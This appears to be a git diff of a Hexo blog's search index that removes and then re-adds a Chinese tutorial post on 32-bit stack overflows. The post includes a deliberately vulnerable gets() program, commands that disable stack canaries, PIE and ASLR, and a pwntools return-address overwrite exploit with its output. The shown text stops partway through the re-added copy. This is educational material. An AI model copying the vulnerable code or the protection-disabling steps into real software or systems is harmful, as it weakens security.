+<p>如果非当前 <code>shell</code> 终端，可以通过 <code>ps auxf | grep adapter-minisite</code> 获取 <code>pid</code> 然后 <code>kill pid</code>。</p>
 ]]></content>
       <categories>
-        <category>Hexo</category>
+        <category>指令</category>
       </categories>
       <tags>
-        <tag>博客搭建</tag>
+        <tag>Linux</tag>
       </tags>
   </entry>
   <entry>
@@ -2046,146 +2072,6 @@ String.format(&quot;abc&quot; )
       </categories>
       <tags>
         <tag>contaminate</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>栈溢出</title>
-    <url>/PWN/%E6%A0%88%E6%BA%A2%E5%87%BA/</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>研究了一段时间，做个总结。</p>
-<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownoabOhk5WZ26NEXg.png"></p>
-<span id="more"></span>
-
-<h1 id="栈（stack）"><a href="#栈（stack）" class="headerlink" title="栈（stack）"></a>栈（stack）</h1><p>栈是一种典型的后进先出 <code>(Last in First Out)</code> 的数据结构，其操作主要有<code>压栈 (push)</code> 与<code>出栈 (pop)</code> 两种操作，如下图所示。两种操作都操作栈顶，当然，它也有栈底。</p>
-<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownP6wHiXuI2TCKBUj.png"></p>
-<p>高级语言在运行时都会被转换为汇编程序，在汇编程序运行过程中，充分利用了这一数据结构。每个程序在运行时都有虚拟地址空间，其中某一部分就是该程序对应的栈，用于保存函数调用信息和局部变量。此外，常见的操作也是压栈与出栈。需要注意的是，<strong>程序的栈是从进程地址空间的高地址向低地址增长的</strong>。</p>
-<p>需要注意的是，32 位和 64 位程序有以下简单的区别</p>
-<ul>
-<li><strong>x86</strong><ul>
-<li><strong>函数参数</strong>在<strong>函数返回地址</strong>的上方</li>
-</ul>
-</li>
-<li><strong>x64</strong><ul>
-<li>System V AMD64 ABI (Linux、FreeBSD、macOS 等采用) 中前六个整型或指针参数依次保存在 <strong>RDI, RSI, RDX, RCX, R8 和 R9 寄存器</strong>中，如果还有更多的参数的话才会保存在栈上。</li>
-<li>内存地址不能大于 0x00007FFFFFFFFFFF，<strong>6 个字节长度</strong>，否则会抛出异常。</li>
-</ul>
-</li>
-</ul>
-<h1 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h1><p>栈溢出指的是程序向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数，因而导致与其相邻的栈中的变量的值被改变。这种问题是一种特定的缓冲区溢出漏洞，类似的还有堆溢出，bss 段溢出等溢出方式。栈溢出漏洞轻则可以使程序崩溃，重则可以使攻击者控制程序执行流程。此外，我们也不难发现，发生栈溢出的基本前提是</p>
-<ul>
-<li>程序必须向栈上写入数据。</li>
-<li>写入的数据大小没有被良好地控制。</li>
-</ul>
-<h1 id="基本示例"><a href="#基本示例" class="headerlink" title="基本示例"></a>基本示例</h1><p>最典型的栈溢出利用是覆盖程序的返回地址为攻击者所控制的地址，<strong>当然需要确保这个地址所在的段具有可执行权限</strong>。下面，我们举一个简单的例子：</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">success</span><span class="params">()</span> &#123; <span class="built_in">puts</span>(<span class="string">&quot;You Hava already controlled it.&quot;</span>); &#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">vulnerable</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">12</span>];</span><br><span class="line">  gets(s);</span><br><span class="line">  <span class="built_in">puts</span>(s);</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span> &#123;</span><br><span class="line">  vulnerable();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-<p>这个程序的主要目的读取一个字符串，并将其输出。<strong>我们希望可以控制程序执行 success 函数。</strong></p>
-<p>我们利用如下命令对其进行编译</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">➜  <span class="built_in">stack</span>-example gcc -m32 -fno-<span class="built_in">stack</span>-protector stack_example.c -o stack_example </span><br><span class="line">stack_example.c: In function ‘vulnerable’:</span><br><span class="line">stack_example.c:<span class="number">6</span>:<span class="number">3</span>: warning: implicit declaration of function ‘gets’ [-Wimplicit-function-declaration]</span><br><span class="line">   gets(s);</span><br><span class="line">   ^</span><br><span class="line">/tmp/ccPU8rRA.o：在函数‘vulnerable’中：</span><br><span class="line">stack_example.c:(.text+<span class="number">0x27</span>): 警告： the `gets<span class="number">&#x27;</span> function is dangerous and should not be used.</span><br></pre></td></tr></table></figure>
-
-
-<p>可以看出 gets 本身是一个危险函数。它从不检查输入字符串的长度，而是以回车来判断输入是否结束，所以很容易可以导致栈溢出</p>
-<blockquote>
-<p>历史上，<strong>莫里斯蠕虫</strong>第一种蠕虫病毒就利用了 gets 这个危险函数实现了栈溢出。</p>
-</blockquote>
-<p>gcc 编译指令中，<code>-m32</code> 指的是生成 32 位程序； <code>-fno-stack-protector</code> 指的是不开启堆栈溢出保护，即不生成 canary。 此外，为了更加方便地介绍栈溢出的基本利用方式，这里还需要关闭 PIE（Position Independent Executable），避免加载基址被打乱。不同 gcc 版本对于 PIE 的默认配置不同，我们可以使用命令<code>gcc -v</code>查看 gcc 默认的开关情况。如果含有<code>--enable-default-pie</code>参数则代表 PIE 默认已开启，需要在编译指令中添加参数<code>-no-pie</code>。</p>
-<p>编译成功后，可以使用 checksec 工具检查编译出的文件：</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">➜  <span class="built_in">stack</span>-example checksec stack_example</span><br><span class="line">    Arch:     i386<span class="number">-32</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No <span class="title function_">PIE</span> <span class="params">(<span class="number">0x8048000</span>)</span></span><br></pre></td></tr></table></figure>
-
-
-<p>提到编译时的 PIE 保护，Linux 平台下还有地址空间分布随机化（ASLR）的机制。简单来说即使可执行文件开启了 PIE 保护，还需要系统开启 ASLR 才会真正打乱基址，否则程序运行时依旧会在加载一个固定的基址上（不过和 No PIE 时基址不同）。我们可以通过修改 <code>/proc/sys/kernel/randomize_va_space</code> 来控制 ASLR 启动与否，具体的选项有：</p>
-<ul>
-<li>0，关闭 ASLR，没有随机化。栈、堆、.so 的基地址每次都相同。</li>
-<li>1，普通的 ASLR。栈基地址、mmap 基地址、.so 加载基地址都将被随机化，但是堆基地址没有随机化。</li>
-<li>2，增强的 ASLR，在 1 的基础上，增加了堆基地址随机化。</li>
-</ul>
-<p>我们可以使用<code>echo 0 &gt; /proc/sys/kernel/randomize_va_space</code>关闭 Linux 系统的 ASLR，类似的，也可以配置相应的参数。</p>
-<p>为了降低后续漏洞利用复杂度，我们这里关闭 ASLR，在编译时关闭 PIE。当然读者也可以尝试 ASLR、PIE 开关的不同组合，配合 IDA 及其动态调试功能观察程序地址变化情况（在 ASLR 关闭、PIE 开启时也可以攻击成功）。</p>
-<p>确认栈溢出和 PIE 保护关闭后，我们利用 IDA 来反编译一下二进制程序并查看 vulnerable 函数 。可以看到</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">vulnerable</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s; <span class="comment">// [sp+4h] [bp-14h]@1</span></span><br><span class="line"></span><br><span class="line">  gets(&amp;s);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(&amp;s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-<p>该字符串距离 ebp 的长度为 0x14，那么相应的栈结构为</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">             +-----------------+</span><br><span class="line">             |     retaddr     |</span><br><span class="line">             +-----------------+</span><br><span class="line">             |     saved ebp   |</span><br><span class="line">      ebp---&gt;+-----------------+</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">s,ebp<span class="number">-0x14</span>--&gt;+-----------------+</span><br></pre></td></tr></table></figure>
-
-
-<p>并且，我们可以通过 IDA 获得 success 的地址，其地址为 0x0804843B。</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.text:<span class="number">0804843B</span> success         proc near</span><br><span class="line">.text:<span class="number">0804843B</span>                 push    ebp</span><br><span class="line">.text:<span class="number">0804843</span>C                 mov     ebp, esp</span><br><span class="line">.text:<span class="number">0804843</span>E                 sub     esp, <span class="number">8</span></span><br><span class="line">.text:<span class="number">08048441</span>                 sub     esp, <span class="number">0</span>Ch</span><br><span class="line">.text:<span class="number">08048444</span>                 push    offset s        ; <span class="string">&quot;You Hava already controlled it.&quot;</span></span><br><span class="line">.text:<span class="number">08048449</span>                 call    _puts</span><br><span class="line">.text:<span class="number">0804844</span>E                 add     esp, <span class="number">10</span>h</span><br><span class="line">.text:<span class="number">08048451</span>                 nop</span><br><span class="line">.text:<span class="number">08048452</span>                 leave</span><br><span class="line">.text:<span class="number">08048453</span>                 retn</span><br><span class="line">.text:<span class="number">08048453</span> success         endp</span><br></pre></td></tr></table></figure>
-
-
-<p>那么如果我们读取的字符串为</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">0x14</span>*<span class="string">&#x27;a&#x27;</span>+<span class="string">&#x27;bbbb&#x27;</span>+success_addr</span><br></pre></td></tr></table></figure>
-
-
-<p>那么，由于 gets 会读到回车才算结束，所以我们可以直接读取所有的字符串，并且将 saved ebp 覆盖为 bbbb，将 retaddr 覆盖为 success_addr，即，此时的栈结构为</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">             +-----------------+</span><br><span class="line">             |    <span class="number">0x0804843B</span>   |</span><br><span class="line">             +-----------------+</span><br><span class="line">             |       bbbb      |</span><br><span class="line">      ebp---&gt;+-----------------+</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">s,ebp<span class="number">-0x14</span>--&gt;+-----------------+</span><br></pre></td></tr></table></figure>
-
-
-<p>但是需要注意的是，由于在计算机内存中，每个值都是按照字节存储的。一般情况下都是采用小端存储，即 0x0804843B 在内存中的形式是</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">\x3b\x84\x04\x08</span><br></pre></td></tr></table></figure>
-
-
-<p>但是，我们又不能直接在终端将这些字符给输入进去，在终端输入的时候 \，x 等也算一个单独的字符。。所以我们需要想办法将 \x3b 作为一个字符输入进去。那么此时我们就需要使用一波 pwntools 了 (关于如何安装以及基本用法，请自行 github)，这里利用 pwntools 的代码如下：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># 构造与程序交互的对象</span></span><br><span class="line">sh = process(<span class="string">&#x27;./stack_example&#x27;</span>)</span><br><span class="line">success_addr = <span class="number">0x0804843b</span></span><br><span class="line"><span class="comment"># 构造payload</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x14</span> + <span class="string">&#x27;bbbb&#x27;</span> + p32(success_addr)</span><br><span class="line"><span class="built_in">print</span> p32(success_addr)</span><br><span class="line"><span class="comment"># 向程序发送字符串</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"><span class="comment"># 将代码交互转换为手工交互</span></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
-
-
-<p>执行一波代码，可以得到</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">➜  <span class="built_in">stack</span>-example python <span class="built_in">exp</span>.py</span><br><span class="line">[+] Starting local process <span class="string">&#x27;./stack_example&#x27;</span>: pid <span class="number">61936</span></span><br><span class="line">;\x84\x0</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">aaaaaaaaaaaaaaaaaaaabbbb;\x84\x0</span><br><span class="line">You Hava already controlled it.</span><br><span class="line">[*] Got EOF <span class="keyword">while</span> reading in interactive</span><br><span class="line">$ </span><br><span class="line">[*] Process <span class="string">&#x27;./stack_example&#x27;</span> stopped with <span class="built_in">exit</span> code <span class="number">-11</span> (SIGSEGV) (pid <span class="number">61936</span>)</span><br><span class="line">[*] Got EOF <span class="keyword">while</span> sending in interactive</span><br></pre></td></tr></table></figure>
-
-
-<p>可以看到我们确实已经执行 success 函数。</p>
-<h1 id="小总结"><a href="#小总结" class="headerlink" title="小总结"></a>小总结</h1><p>上面的示例其实也展示了栈溢出中比较重要的几个步骤。</p>
-<h3 id="寻找危险函数"><a href="#寻找危险函数" class="headerlink" title="寻找危险函数"></a>寻找危险函数</h3><p>通过寻找危险函数，我们快速确定程序是否可能有栈溢出，以及有的话，栈溢出的位置在哪里。常见的危险函数如下</p>
-<ul>
-<li>输入<ul>
-<li>gets，直接读取一行，忽略’\x00’</li>
-<li>scanf</li>
-<li>vscanf</li>
-</ul>
-</li>
-<li>输出<ul>
-<li>sprintf</li>
-</ul>
-</li>
-<li>字符串<ul>
-<li>strcpy，字符串复制，遇到’\x00’停止</li>
-<li>strcat，字符串拼接，遇到’\x00’停止</li>
-<li>bcopy</li>
-</ul>
-</li>
-</ul>
-<h3 id="确定填充长度"><a href="#确定填充长度" class="headerlink" title="确定填充长度"></a>确定填充长度</h3><p>这一部分主要是计算<strong>我们所要操作的地址与我们所要覆盖的地址的距离</strong>。常见的操作方法就是打开 IDA，根据其给定的地址计算偏移。一般变量会有以下几种索引模式</p>
-<ul>
-<li>相对于栈基地址的的索引，可以直接通过查看 EBP 相对偏移获得</li>
-<li>相对应栈顶指针的索引，一般需要进行调试，之后还是会转换到第一种类型。</li>
-<li>直接地址索引，就相当于直接给定了地址。</li>
-</ul>
-<p>一般来说，我们会有如下的覆盖需求</p>
-<ul>
-<li><strong>覆盖函数返回地址</strong>，这时候就是直接看 EBP 即可。</li>
-<li><strong>覆盖栈上某个变量的内容</strong>，这时候就需要更加精细的计算了。</li>
-<li><strong>覆盖 bss 段某个变量的内容</strong>。</li>
-<li>根据现实执行情况，覆盖特定的变量或地址的内容。</li>
-</ul>
-<p>之所以我们想要覆盖某个地址，是因为我们想通过覆盖地址的方法来<strong>直接或者间接地控制程序执行流程</strong>。</p>
-<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownjBQdLcvCeyPfIi8.png"></p>
-<p>运行时程序的栈：<br>上面高地址处存放的是环境变量和main函数的信息<br>往下是主调函数的栈内存，包括临时变量和控制信息（控制信息包括返回地址和ebp等用来保存的寄存器的值）</p>
-<p>调用约定：<br>每个函数调用的时候都会自己平衡自己的堆栈。</p>
-<p>每个被调函数被调用的时候先push　ebp所以栈里面会有返回地址和ebp</p>
-<h2 id="两个表"><a href="#两个表" class="headerlink" title="两个表"></a><strong>两个表</strong></h2><p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownnbq1cslCgh27owZ.png"></p>
-<ul>
-<li>全局偏移表<code>（GOT：Global Offset Table）</code>存放外部的函数地址</li>
-<li>程序链接表<code>（PLT：Procedure Link Table）</code>存放额外代码</li>
-</ul>
-<p>plt表：函数调用的时候先使用的。<strong>PLT表中的每一项的-数据内容都是对应的GOT表中一项的地址这个是固定不变的</strong>，<strong>PLT表中的数据是跳转到GOT表项的地址</strong>。  </p>
-<p>got表：一个指向真正运行函数首地址的指针。</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">scanf</span>函数</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>,&amp;a,&amp;b);</span><br><span class="line">遇到空格(<span class="number">0x20</span>)停止读取</span><br><span class="line"></span><br><span class="line">read函数</span><br><span class="line"><span class="type">ssize_t</span> <span class="title function_">read</span>  <span class="params">(<span class="type">int</span> fd, <span class="type">void</span> *buf, <span class="type">size_t</span> count)</span>;</span><br><span class="line">读取数据遇到\n(<span class="number">0x0a</span>)结束，\x0a会读进去</span><br><span class="line">fd为<span class="number">0</span>从键盘读取</span><br><span class="line"></span><br><span class="line">gets函数</span><br><span class="line">gets(str);</span><br><span class="line">输入遇到\n(<span class="number">0x0a</span>)结束</span><br><span class="line">\x0a不会读进去</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>函数</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, i);</span><br><span class="line">输出直到\x00</span><br><span class="line"></span><br><span class="line">write函数</span><br><span class="line"><span class="type">ssize_t</span> <span class="title function_">write</span><span class="params">(<span class="type">int</span> fd, <span class="type">const</span> <span class="type">void</span> *buf, <span class="type">size_t</span> nbyte)</span>;</span><br><span class="line">fd为<span class="number">1</span>输出到显示器</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>函数</span><br><span class="line"><span class="built_in">puts</span>(<span class="type">char</span> *)</span><br><span class="line">相当于<span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,s)</span><br><span class="line">输出字符串（遇到\x00结束）</span><br><span class="line"></span><br><span class="line"><span class="built_in">strcpy</span>函数</span><br><span class="line"><span class="type">char</span> *<span class="title function_">strcpy</span><span class="params">(<span class="type">char</span> *dst, <span class="type">const</span> <span class="type">char</span> *src)</span>;</span><br><span class="line">一直复制直到遇到\x00</span><br><span class="line"></span><br><span class="line"><span class="built_in">memcpy</span>函数</span><br><span class="line"><span class="type">void</span> *<span class="title function_">memcpy</span><span class="params">(<span class="type">void</span> *dest, <span class="type">const</span> <span class="type">void</span> *src, <span class="type">size_t</span> n)</span>;</span><br><span class="line">复制任意内容</span><br><span class="line"></span><br><span class="line"><span class="built_in">strncpy</span>函数</span><br><span class="line"><span class="type">char</span> *<span class="title function_">strncpy</span><span class="params">(<span class="type">char</span> *dest,<span class="type">char</span> *src,<span class="type">int</span> <span class="type">size_t</span> n)</span>;</span><br><span class="line">如果n&lt;src的长度，只是将src的前n个字符复制到dest的前n个字符，不自动添加<span class="string">&#x27;\0&#x27;</span>。如果src的长度小于n个字节，则以<span class="literal">NULL</span>填充dest直到复制完n个字节</span><br></pre></td></tr></table></figure>
-]]></content>
-      <categories>
-        <category>二进制安全</category>
-      </categories>
-      <tags>
-        <tag>栈溢出</tag>
       </tags>
   </entry>
   <entry>
@@ -2538,29 +2424,143 @@ String.format(&quot;abc&quot; )
       </tags>
   </entry>
   <entry>
-    <title>nohup命令</title>
-    <url>/Linux/nohup%E5%91%BD%E4%BB%A4/</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>如果你正在运行一个进程，而且你觉得在退出帐户时该进程还不会结束，那么可以使用 nohup 命令。</p>
+    <title>栈溢出</title>
+    <url>/PWN/%E6%A0%88%E6%BA%A2%E5%87%BA/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>研究了一段时间，做个总结。</p>
+<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownoabOhk5WZ26NEXg.png"></p>
 <span id="more"></span>
 
-<h1 id="命令简介"><a href="#命令简介" class="headerlink" title="命令简介"></a>命令简介</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ nohup Command [ Arg … ] [ &amp; ]</span><br></pre></td></tr></table></figure>
+<h1 id="栈（stack）"><a href="#栈（stack）" class="headerlink" title="栈（stack）"></a>栈（stack）</h1><p>栈是一种典型的后进先出 <code>(Last in First Out)</code> 的数据结构，其操作主要有<code>压栈 (push)</code> 与<code>出栈 (pop)</code> 两种操作，如下图所示。两种操作都操作栈顶，当然，它也有栈底。</p>
+<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownP6wHiXuI2TCKBUj.png"></p>
+<p>高级语言在运行时都会被转换为汇编程序，在汇编程序运行过程中，充分利用了这一数据结构。每个程序在运行时都有虚拟地址空间，其中某一部分就是该程序对应的栈，用于保存函数调用信息和局部变量。此外，常见的操作也是压栈与出栈。需要注意的是，<strong>程序的栈是从进程地址空间的高地址向低地址增长的</strong>。</p>
+<p>需要注意的是，32 位和 64 位程序有以下简单的区别</p>
+<ul>
+<li><strong>x86</strong><ul>
+<li><strong>函数参数</strong>在<strong>函数返回地址</strong>的上方</li>
+</ul>
+</li>
+<li><strong>x64</strong><ul>
+<li>System V AMD64 ABI (Linux、FreeBSD、macOS 等采用) 中前六个整型或指针参数依次保存在 <strong>RDI, RSI, RDX, RCX, R8 和 R9 寄存器</strong>中，如果还有更多的参数的话才会保存在栈上。</li>
+<li>内存地址不能大于 0x00007FFFFFFFFFFF，<strong>6 个字节长度</strong>，否则会抛出异常。</li>
+</ul>
+</li>
+</ul>
+<h1 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h1><p>栈溢出指的是程序向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数，因而导致与其相邻的栈中的变量的值被改变。这种问题是一种特定的缓冲区溢出漏洞，类似的还有堆溢出，bss 段溢出等溢出方式。栈溢出漏洞轻则可以使程序崩溃，重则可以使攻击者控制程序执行流程。此外，我们也不难发现，发生栈溢出的基本前提是</p>
+<ul>
+<li>程序必须向栈上写入数据。</li>
+<li>写入的数据大小没有被良好地控制。</li>
+</ul>
+<h1 id="基本示例"><a href="#基本示例" class="headerlink" title="基本示例"></a>基本示例</h1><p>最典型的栈溢出利用是覆盖程序的返回地址为攻击者所控制的地址，<strong>当然需要确保这个地址所在的段具有可执行权限</strong>。下面，我们举一个简单的例子：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">success</span><span class="params">()</span> &#123; <span class="built_in">puts</span>(<span class="string">&quot;You Hava already controlled it.&quot;</span>); &#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">vulnerable</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">12</span>];</span><br><span class="line">  gets(s);</span><br><span class="line">  <span class="built_in">puts</span>(s);</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span> &#123;</span><br><span class="line">  vulnerable();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p>该命令可以在你退出帐户&#x2F;关闭终端之后继续运行相应的进程。<code>nohup</code>就是不挂起的意思（<code>no hang up</code>）。</p>
-<p><code>nohup</code> 运行由 <code>Command</code> 和相关的 <code>Arg</code> 参数指定的命令，忽略所有挂断（<code>SIGHUP</code>）信号。要运行后台中的 <code>nohup</code> 命令，添加 <code>&amp;</code> （ 表示 <code>and</code> 的符号）到命令的尾部。</p>
-<p>如果使用 <code>nohup</code> 命令提交作业，那么在缺省情况下该作业的所有输出都被重定向到一个名为 nohup.out 的文件中，除非另外指定了输出文件。</p>
-<h1 id="使用举例"><a href="#使用举例" class="headerlink" title="使用举例"></a>使用举例</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ nohup java -jar adapter-minisite.jar /tomcat-1 /tomcat-2 &gt; logs.txt 2&gt;&amp;1 &amp;</span><br></pre></td></tr></table></figure>
 
-<p>在上面的例子中，运行命令 <code>java -jar adapter-minisite.jar</code> 输入参数 <code>/tomcat-1</code> 和 <code>/tomcat-2</code>，输出被重定向到 <code>logs.txt</code> 文件中。</p>
-<h1 id="退出任务"><a href="#退出任务" class="headerlink" title="退出任务"></a>退出任务</h1><p>如果运行的任务在当前 <code>shell</code> 终端，可以通过 <code>jobs</code> 命令查询相关信息，并且杀掉进程。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 查看当前 shell 终端的后台运行任务进程信息</span><br><span class="line">$ jobs</span><br><span class="line">[1]+ Running nohup java -jar adapter-minisite.jar /tomcat-1 /tomcat-2 &gt; logs.txt 2&gt;&amp;1 &amp;</span><br><span class="line"></span><br><span class="line"># 杀掉任务号</span><br><span class="line">$ kill %1</span><br><span class="line"></span><br><span class="line"># 或着找到 pid</span><br><span class="line">$ jobs -l</span><br><span class="line">[1]+ 11076 Running nohup java -jar adapter-minisite.jar /tomcat-1 /tomcat-2 &gt; logs.txt 2&gt;&amp;1 &amp;</span><br><span class="line"></span><br><span class="line">$ kill 11076</span><br><span class="line"></span><br><span class="line"># 或着</span><br><span class="line">$ fg %n # 置为前端运行</span><br><span class="line"></span><br><span class="line">Ctrl + c # 退出</span><br></pre></td></tr></table></figure>
+<p>这个程序的主要目的读取一个字符串，并将其输出。<strong>我们希望可以控制程序执行 success 函数。</strong></p>
+<p>我们利用如下命令对其进行编译</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">➜  <span class="built_in">stack</span>-example gcc -m32 -fno-<span class="built_in">stack</span>-protector stack_example.c -o stack_example </span><br><span class="line">stack_example.c: In function ‘vulnerable’:</span><br><span class="line">stack_example.c:<span class="number">6</span>:<span class="number">3</span>: warning: implicit declaration of function ‘gets’ [-Wimplicit-function-declaration]</span><br><span class="line">   gets(s);</span><br><span class="line">   ^</span><br><span class="line">/tmp/ccPU8rRA.o：在函数‘vulnerable’中：</span><br><span class="line">stack_example.c:(.text+<span class="number">0x27</span>): 警告： the `gets<span class="number">&#x27;</span> function is dangerous and should not be used.</span><br></pre></td></tr></table></figure>
 
-<p>如果非当前 <code>shell</code> 终端，可以通过 <code>ps auxf | grep adapter-minisite</code> 获取 <code>pid</code> 然后 <code>kill pid</code>。</p>
+
+<p>可以看出 gets 本身是一个危险函数。它从不检查输入字符串的长度，而是以回车来判断输入是否结束，所以很容易可以导致栈溢出</p>
+<blockquote>
+<p>历史上，<strong>莫里斯蠕虫</strong>第一种蠕虫病毒就利用了 gets 这个危险函数实现了栈溢出。</p>
+</blockquote>
+<p>gcc 编译指令中，<code>-m32</code> 指的是生成 32 位程序； <code>-fno-stack-protector</code> 指的是不开启堆栈溢出保护，即不生成 canary。 此外，为了更加方便地介绍栈溢出的基本利用方式，这里还需要关闭 PIE（Position Independent Executable），避免加载基址被打乱。不同 gcc 版本对于 PIE 的默认配置不同，我们可以使用命令<code>gcc -v</code>查看 gcc 默认的开关情况。如果含有<code>--enable-default-pie</code>参数则代表 PIE 默认已开启，需要在编译指令中添加参数<code>-no-pie</code>。</p>
+<p>编译成功后，可以使用 checksec 工具检查编译出的文件：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">➜  <span class="built_in">stack</span>-example checksec stack_example</span><br><span class="line">    Arch:     i386<span class="number">-32</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No <span class="title function_">PIE</span> <span class="params">(<span class="number">0x8048000</span>)</span></span><br></pre></td></tr></table></figure>
+
+
+<p>提到编译时的 PIE 保护，Linux 平台下还有地址空间分布随机化（ASLR）的机制。简单来说即使可执行文件开启了 PIE 保护，还需要系统开启 ASLR 才会真正打乱基址，否则程序运行时依旧会在加载一个固定的基址上（不过和 No PIE 时基址不同）。我们可以通过修改 <code>/proc/sys/kernel/randomize_va_space</code> 来控制 ASLR 启动与否，具体的选项有：</p>
+<ul>
+<li>0，关闭 ASLR，没有随机化。栈、堆、.so 的基地址每次都相同。</li>
+<li>1，普通的 ASLR。栈基地址、mmap 基地址、.so 加载基地址都将被随机化，但是堆基地址没有随机化。</li>
+<li>2，增强的 ASLR，在 1 的基础上，增加了堆基地址随机化。</li>
+</ul>
+<p>我们可以使用<code>echo 0 &gt; /proc/sys/kernel/randomize_va_space</code>关闭 Linux 系统的 ASLR，类似的，也可以配置相应的参数。</p>
+<p>为了降低后续漏洞利用复杂度，我们这里关闭 ASLR，在编译时关闭 PIE。当然读者也可以尝试 ASLR、PIE 开关的不同组合，配合 IDA 及其动态调试功能观察程序地址变化情况（在 ASLR 关闭、PIE 开启时也可以攻击成功）。</p>
+<p>确认栈溢出和 PIE 保护关闭后，我们利用 IDA 来反编译一下二进制程序并查看 vulnerable 函数 。可以看到</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">vulnerable</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s; <span class="comment">// [sp+4h] [bp-14h]@1</span></span><br><span class="line"></span><br><span class="line">  gets(&amp;s);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(&amp;s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+<p>该字符串距离 ebp 的长度为 0x14，那么相应的栈结构为</p>
